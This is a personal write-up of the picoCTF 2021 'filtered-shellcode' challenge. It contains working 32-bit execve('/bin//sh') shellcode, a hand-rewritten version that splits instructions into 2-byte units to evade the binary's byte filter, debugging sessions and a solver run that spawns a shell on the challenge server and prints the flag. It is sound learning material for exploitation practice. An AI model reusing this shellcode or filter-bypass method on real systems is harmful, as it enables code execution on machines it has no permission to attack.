# Lesson
- shellcode  
  - Linux system calls set arguments in registers and are invoked by a software interrupt using "int 0x80".  
    - https://www.mztn.org/lxasm/int80.html  
    - https://www.mztn.org/lxasm/asm04.html  
- system call  
  - https://os.pubpub.org/pub/blog-1/release/4  
- kernel  
- how to understand a logic  
  - (light) grasp the overview with gdb  
  - (heavy) read code manually  
- `pwntools`
  - how to check a value around "eax"
    ```zsh
    pwndbg> hexdump $eax
    ```

# Memo
1. check  
```zsh
$ file fun
fun: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=325e35378982f451f374c7140c5249bb1c52ab18, not stripped
$
$ checksec --file=./fun --output=json | jq .
{
  "./fun": {
    "relro": "partial",
    "canary": "no",
    "nx": "no",
    "pie": "no",
    "rpath": "no",
    "runpath": "no",
    "symbols": "yes",
    "fortify_source": "no",
    "fortified": "0",
    "fortify-able": "0"
  }
}
```

2. ghidra and pwndbg
```
pwndbg> b *0x080485c9
Breakpoint 1 at 0x80485c9
pwndbg> run
Give me code to run:
abcdefghijklmn

Breakpoint 1, 0x080485c9 in execute ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────
*EAX  0xffffca00 ◂— 0x90906261
*EBX  0xffffca20 —▸ 0xf7f9ba60 (_IO_file_jumps) ◂— 0x0
*ECX  0xffffca00 ◂— 0x90906261
*EDX  0xffffca00 ◂— 0x90906261
*EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
*ESI  0xffffcf24 —▸ 0xffffd075 ◂— '/mnt/c/Users/user/CTF/picoCTF2021/Binary_Exploitation/filtered-shellcode/fun'
*EBP  0xffffca48 —▸ 0xffffce58 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0x0
*ESP  0xffffca00 ◂— 0x90906261
*EIP  0x80485c9 (execute+211) ◂— call eax
────────────────────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]─────────────────────────────────────────────────────────────────────────────
 ► 0x80485c9 <execute+211>    call   eax                           <0xffffca00>

   0x80485cb <execute+213>    mov    esp, ebx
   0x80485cd <execute+215>    nop
   0x80485ce <execute+216>    mov    ebx, dword ptr [ebp - 4]
   0x80485d1 <execute+219>    leave
   0x80485d2 <execute+220>    ret

   0x80485d3 <main>           lea    ecx, [esp + 4]
   0x80485d7 <main+4>         and    esp, 0xfffffff0
   0x80485da <main+7>         push   dword ptr [ecx - 4]
   0x80485dd <main+10>        push   ebp
   0x80485de <main+11>        mov    ebp, esp
─────────────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────────────
00:0000│ eax ecx edx esp 0xffffca00 ◂— 0x90906261
01:0004│-044             0xffffca04 ◂— 0x90906463
02:0008│-040             0xffffca08 ◂— 0x90906665
03:000c│-03c             0xffffca0c ◂— 0x90906867
04:0010│-038             0xffffca10 ◂— 0x90906a69
05:0014│-034             0xffffca14 ◂— 0x90906c6b
06:0018│-030             0xffffca18 ◂— 0x90906e6d
07:001c│-02c             0xffffca1c —▸ 0x80485c3 (execute+205) ◂— mov dword ptr [ebp - 0x20], eax
───────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────────────
 ► 0 0x80485c9 execute+211
   1 0x80486a8 main+213
   2 0xf7d94519 __libc_start_call_main+121
   3 0xf7d945f3 __libc_start_main+147
   4 0x8048412 _start+50
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> hexdump $eax
0x%x is larger than the maximum address, truncating to 0x%x instead 18446744073709537792 4294953472
+0000 0xffffca00  61 62 90 90  63 64 90 90  65 66 90 90  67 68 90 90  │ab..│cd..│ef..│gh..│
+0010 0xffffca10  69 6a 90 90  6b 6c 90 90  6d 6e 90 90  c3 85 04 08  │ij..│kl..│mn..│....│
+0020 0xffffca20  60 ba f9 f7  80 cb ff f7  00 ca ff ff  00 ca ff ff  │`...│....│....│....│
+0030 0xffffca30  1c 00 00 00  1c 00 00 00  0e 00 00 00  1c 00 00 00  │....│....│....│....│
pwndbg>
```

3. create shellcode  
    1.  use this as a reference.  
        https://shell-storm.org/shellcode/files/shellcode-517.html  
        ```
        "\x31\xc9"                  // xor    %ecx,%ecx
        "\xf7\xe1"                  // mul    %ecx
        "\x51"                      // push   %ecx
        "\x68\x2f\x2f\x73\x68"      // push   $0x68732f2f
        "\x68\x2f\x62\x69\x6e"      // push   $0x6e69622f
        "\x89\xe3"                  // mov    %esp,%ebx
        "\xb0\x0b"                  // mov    $0xb,%al
        "\xcd\x80"                  // int    $0x80
        ```
    2. customize the assembly for pass a filter of the provided binary  
        Packing assembly instructions into 2-byte units for bypass the filter.  
        https://www.mztn.org/lxasm64/amd09_shift.html  
        - test assembly
          ```zsh
          $ pwn asm -c 32 nop
          90
          $ pwn asm -c 32 "nop;nop"
          9090
          $ pwn asm -c 32 "push eax"
          50
          $ pwn asm -c 32 "shl eax, 1"
          d1e0
          $ pwn asm -c 32 "push 43"
          $ pwn asm -c 32 "xor eax eax"
          $ pwn asm -c 32 "xor eax,eax"
          $ pwn asm -c 32 "mov al, 0x68"
          $ pwn asm -c 32 "shl eax"
          $ pwn asm -c 32 "mov ax 0x6873"
          $ pwn asm -c 32 "mov ax, 0x6873"
          $ pwn asm -c 32 "shl eax, 12"
          $ pwn asm -c 32 "shl eax, 1"
          $ pwn asm -c 32 "shl eax, 2"
          $ pwn asm -c 32 "mov al, 0x73"
          $ pwn asm -c 32 "mov al, 0x2f"
          $ pwn asm -c 32 "push eax"
          $ pwn asm -c 32 "mov al, 0x6e"
          $ pwn asm -c 32 "mov al, 0x69"
          ```
        - custmized assembly instructions
          ```zsh
          "\x31\xc9"                  // xor    %ecx,%ecx
          "\xf7\xe1"                  // mul    %ecx
          "\x51"                      // push   %ecx

          \x90                        // nop

          // "\x68\x2f\x2f\x73\x68"      // push   $0x68732f2f

          ###
          \x31\xc0 // xor eax,eax

          \xb0\x68                  // mov al, 0x68
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax


          \xb0\x73                  // mov al, 0x73
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax

          \xb0\x2f                  // mov al, 0x2f
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax

          \xb0\x2f                  // mov al, 0x2f

          \x50                      // push eax
          \x90                      // nop


          // "\x68\x2f\x62\x69\x6e"      // push   $0x6e69622f

          \x31\xc0 // xor eax,eax

          \xb0\x6e                  // mov al, 0x6e
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax


          \xb0\x69                  // mov al, 0x69
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax

          \xb0\x62                  // mov al, 0x62
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax
          \xd1\xe0                  // shl eax

          \xb0\x2f                  // mov al, 0x2f

          \x50                      // push eax
          \x90                      // nop

          ###

          "\x89\xe3"                  // mov    %esp,%ebx
          "\xb0\x0b"                  // mov    $0xb,%al
          "\xcd\x80"                  // int    $0x80
          ```


4. debug test shellcode
    - OK
      ```zsh
      $ nasm -f elf32 test.asm -o test.o
      $ ld -m elf_i386 -s -o test test.o
      $ ./test
      $$ ls
      test.asm
      test.o
      test
      ```
    - NG: Compiler Error  
      write assembly correct;y and select apropriate options.
      ```zsh
      $ nasm -f elf32 test.asm -o test.o
      $ ld -s -o test test.o            
      ld: i386 architecture of input file 'test.o' is incompatible with i386:x86-64 output
      ```
    - NG: Assembly Error  
      when the code does not work, check the logic with `gdb`.
      ```zsh
      $ nasm -f elf32 test.asm -o test.o
      $ ld -m elf_i386 -s -o test test.o
      $ ./test
      zsh: segmentation fault  ./test
      $ gdb ./test
      ```  
       - NG assembly patterns  
        I skip to write "shl eax, 1" 8 times with "shl eax, 8".
          - OK
            ```
            mov     al,     0x68
            shl     eax,    8
            mov     al,     0x73
            shl     eax,    8
            mov     al,     0x2f
            shl     eax,    8
            mov     al,     0x2f
            push    eax
            ```
            ```
            EAX  0x68732f2f ('//sh')

            00:0000│ esp 0xffffcd88 ◂— '//sh'
            ```
          - OK
            ```
            mov     al,     0x68
            shl     eax,    8
            mov     al,     0x73
            shl     eax,    8
            mov     al,     0x2f
            push    eax
            ```
            ```
            EAX  0x68732f

            00:0000│ esp 0xffffcd88 ◂— 0x68732f /* '/sh' */
            ```
          - OK
            ```
            mov     al,     0x00
            shl     eax,    8
            mov     al,     0x68
            shl     eax,    8
            mov     al,     0x73
            shl     eax,    8
            mov     al,     0x2f
            push    eax
            ```
            ```
            EAX  0x68732f

            00:0000│ esp 0xffffcd88 ◂— 0x68732f /* '/sh' */
            ```
          - NG
            ```
            mov     al,     0x68
            shl     eax,    8
            mov     al,     0x73
            shl     eax,    8
            mov     al,     0x2f
            shl     eax,    8
            mov     al,     0x00
            push    eax
            ```
            ```
            EAX  0x68732f00

            00:0000│ esp 0xffffcd88 ◂— 0x68732f00
            ```

5. write solver  
    test on local  
    ```zsh
    $ python solver.py LOCAL
    ```
    It works well.  
    ```zsh
    $ python solver.py
    [+] Opening connection to mercury.picoctf.net on port 37853: Done
    b'Give me code to run:'
    [*] Switching to interactive mode

    $ ls
    flag.txt
    fun
    fun.c
    xinet_startup.sh
    $ cat flag.txt
    picoCTF{th4t_w4s_fun_edd8e0b87b2038ea}$
    $
    ```

# Ref
- https://cyb3rwhitesnake.medium.com/picoctf-filtered-shellcode-pwn-3d69010376df  
- https://sh0ebill.hatenablog.com/entry/2022/11/13/204614  
- https://zenn.dev/t0m3y/scraps/275ba361c564c8  
- https://www.mztn.org/lxasm/asm01.html  
- https://stackoverflow.com/questions/19200333/  
- architecture-of-i386-input-file-is-incompatible-with-i386x86-64  
